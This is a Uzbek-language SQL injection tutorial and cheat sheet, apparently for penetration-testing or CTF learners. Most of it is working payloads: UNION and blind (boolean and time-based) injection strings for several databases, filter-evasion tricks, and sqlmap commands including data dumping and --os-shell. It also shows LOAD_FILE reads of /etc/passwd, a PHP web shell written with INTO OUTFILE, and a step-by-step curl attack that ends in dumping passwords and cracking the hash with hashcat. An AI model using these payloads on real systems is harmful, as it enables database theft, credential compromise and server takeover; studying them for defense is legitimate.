# 🗄️ SQL Injection (SQL Kiritish Zaifligi)

> **Maqsad:** Veb-ilovaning SQL so'roviga o'z buyrug'ingizni qo'shib, ma'lumotlar bazasini o'qish, o'zgartirish yoki serverga kirish.

---

## 📖 Asosiy Tushunchalar

### SQL Injection nima?
Foydalanuvchi ma'lumotlari SQL so'rovga to'g'ridan-to'g'ri qo'shilsa, hujumchi so'rovni o'zgartirishi mumkin.

**Zaif PHP kodi:**
```php
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username='$username'";
```

**Normal:** `?username=admin` → `SELECT * FROM users WHERE username='admin'`

**Hujum:** `?username=admin' OR 1=1-- -` → 
```sql
SELECT * FROM users WHERE username='admin' OR 1=1-- -'
-- OR 1=1 har doim TRUE → barcha foydalanuvchilar qaytariladi
```

---

## 🔤 SQL Asoslari (Eslatma)

```sql
-- Asosiy buyruqlar:
SELECT column FROM table WHERE condition;
SELECT * FROM users;                        -- Barcha ustunlar
SELECT username, password FROM users;       -- Aniq ustunlar
SELECT * FROM users WHERE id=1;
SELECT * FROM users WHERE username='admin';

-- Birlashtirish:
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3;

-- Izohlar (comment):
-- Bu izoh (MySQL, MSSQL)
# Bu izoh (MySQL)
/* Bu izoh */ (barcha SQL)

-- Ma'lumot olish:
SELECT database();                           -- Joriy DB nomi
SELECT version();                            -- DB versiyasi
SELECT user();                               -- Joriy foydalanuvchi
SELECT table_name FROM information_schema.tables;  -- Barcha jadvallar
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

---

## 🧪 SQL Injection Turlari

### 1. In-band SQLi — Natija To'g'ridan Ko'rinadi

#### a) Error-based (Xatoga asoslangan)
Xato xabar orqali ma'lumot olish.
```sql
'                           -- Yagona tirnoq → xato kelishi mumkin
''                          -- Ikki tirnoq
`                           -- Backtick
')                          -- Qavs bilan
"))                         -- Ikki qavs
```

#### b) UNION-based (UNION asosida)
```sql
-- Ustunlar sonini aniqlash:
' ORDER BY 1-- -            -- Xato yo'q
' ORDER BY 2-- -            -- Xato yo'q
' ORDER BY 3-- -            -- XATO! → 2 ta ustun bor

-- UNION bilan ma'lumot olish:
' UNION SELECT 1,2-- -
' UNION SELECT 1,database()-- -          -- DB nomi
' UNION SELECT 1,version()-- -           -- Version
' UNION SELECT 1,user()-- -              -- Foydalanuvchi

-- Jadvallarni olish:
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- -

-- Ustunlarni olish:
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Ma'lumot olish:
' UNION SELECT 1,concat(username,':',password) FROM users-- -
```

### 2. Blind SQLi — Natija Ko'rinmaydi

#### a) Boolean-based (Mantiqiy asosda)
```sql
-- TRUE va FALSE javoblarini solishtirish:
?id=1' AND 1=1-- -          -- TRUE: normal sahifa
?id=1' AND 1=2-- -          -- FALSE: bo'sh/boshqa sahifa

-- DB nomini aniqlash (belma-bel):
?id=1' AND substring(database(),1,1)='a'-- -   -- Birinchi harf 'a' mi?
?id=1' AND substring(database(),1,1)='b'-- -   -- 'b' mi?
-- va h.k. (avtomatik: sqlmap)
```

#### b) Time-based (Vaqtga asoslangan)
```sql
-- MySQL: SLEEP() → kechikish bo'lsa, zaiflik bor
?id=1' AND SLEEP(5)-- -           -- 5 soniya kuting
?id=1'; SLEEP(5)-- -

-- MSSQL: WAITFOR
'; WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL: pg_sleep
'; SELECT pg_sleep(5)-- -

-- Oracle: dbms_pipe
'; BEGIN dbms_pipe.receive_message('a',5); END;-- -
```

---

## 🔧 SQLMap — Avtomatik Vosita

```bash
# Asosiy skan
sqlmap -u "http://target.com/page?id=1"

# POST so'rov
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Barcha DB larni sanash
sqlmap -u "http://target.com/page?id=1" --dbs

# Jadvallarni ko'rish
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Ustunlarni ko'rish
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns

# Ma'lumotlarni olish
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Cookie bilan
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Burp Suite dan request fayl
sqlmap -r request.txt

# Daraja va risk oshirish
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Tezlashtirish
sqlmap -u "http://target.com/page?id=1" --threads=10

# OS shell (agar ruxsat bo'lsa)
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## 📋 Ma'lumotlar Sxemasi (Schema — Ko'rinishi)

```sql
-- Barcha ma'lumotlar bazalari:
SELECT schema_name FROM information_schema.schemata;

-- Joriy DB dagi jadvallar:
SELECT table_name FROM information_schema.tables 
WHERE table_schema=database();

-- Jadval ustunlari:
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_name='users';

-- MySQL: barcha narsani olish
SELECT * FROM mysql.user;          -- Foydalanuvchilar
SELECT @@datadir;                  -- Ma'lumotlar yo'li
SELECT @@version;                  -- Versiya
```

---

## 🚫 Filtrlarni Chetlab O'tish

```sql
-- Bo'sh joy o'rniga:
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users     -- Tab
SELECT%0aUsername%0aFROM%0aUsers     -- Yangi qator

-- Kalit so'zlar filtrilgan:
SeLeCt, UNION ALL, /*!UNION*/ SELECT

-- Qo'sh UNION:
' UNION UNION SELECT 1,2-- -

-- Tirnoq filtrilgan:
WHERE username=0x61646d696e             -- 'admin' hex
WHERE username=CHAR(97,100,109,105,110) -- 'admin' char

-- URL encoding:
%27 = '
%20 = boʻsh joy
%23 = #
%2D%2D = --
```

---

## 💾 Fayl O'qish va Yozish (MySQL)

```sql
-- Fayl o'qish (FILE ruxsati kerak):
' UNION SELECT 1,LOAD_FILE('/etc/passwd')-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php')-- -

-- Fayl yozish (web shell):
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' 
  INTO OUTFILE '/var/www/html/shell.php'-- -

-- Keyin shell ga kirish:
http://target.com/shell.php?cmd=id
```

---

## 🎯 Amaliy Misol: To'liq SQL Injection Hujumi

```bash
# 1-qadam: Zaiflikni aniqlash
curl "http://target.com/page?id=1'"      # Xato bo'lsa → zaiflik!
curl "http://target.com/page?id=1 AND 1=1-- -"   # Normal javob
curl "http://target.com/page?id=1 AND 1=2-- -"   # Boshqa javob

# 2-qadam: Ustunlar sonini aniqlash
curl "http://target.com/page?id=1 ORDER BY 1-- -"   # OK
curl "http://target.com/page?id=1 ORDER BY 2-- -"   # OK
curl "http://target.com/page?id=1 ORDER BY 3-- -"   # XATO → 2 ta ustun

# 3-qadam: Ko'rinadigan ustunni aniqlash
curl "http://target.com/page?id=-1 UNION SELECT 1,2-- -"
# Sahifada qaysi raqam chiqsa, o'sha ustun ko'rinadi

# 4-qadam: DB nomini olish
curl "http://target.com/page?id=-1 UNION SELECT 1,database()-- -"

# 5-qadam: Jadvallarni olish
curl "http://target.com/page?id=-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- -"
# Natija: users, products, orders

# 6-qadam: Ustunlarni olish
curl "http://target.com/page?id=-1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -"
# Natija: id, username, password, email

# 7-qadam: Ma'lumot olish
curl "http://target.com/page?id=-1 UNION SELECT 1,concat(username,0x3a,password) FROM users-- -"
# 0x3a = ':' belgi
# Natija: admin:5f4dcc3b5aa765d61d8327deb882cf99

# 8-qadam: Hashni crack qilish
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# MD5 crack → password
```

---

## 💡 Eslab Qolish Uchun

| Vaziyat | Buyruq |
|---------|--------|
| Sinov | `'` yoki `1' AND 1=1-- -` |
| Ustun soni | `ORDER BY N-- -` |
| UNION | `UNION SELECT 1,2-- -` |
| DB nomi | `database()` |
| Jadvallar | `information_schema.tables` |
| Ustunlar | `information_schema.columns` |
| Parollar | `concat(user,0x3a,pass) FROM users` |

**Izohlar:**
- MySQL: `-- -` yoki `#`
- MSSQL: `--`
- Oracle: `--`
- SQLite: `--`

**SQLMap tezkor:**
```bash
sqlmap -u "URL?id=1" --dbs                    # DB lar
sqlmap -u "URL?id=1" -D dbname --tables       # Jadvallar
sqlmap -u "URL?id=1" -D dbname -T users --dump  # Ma'lumotlar
```
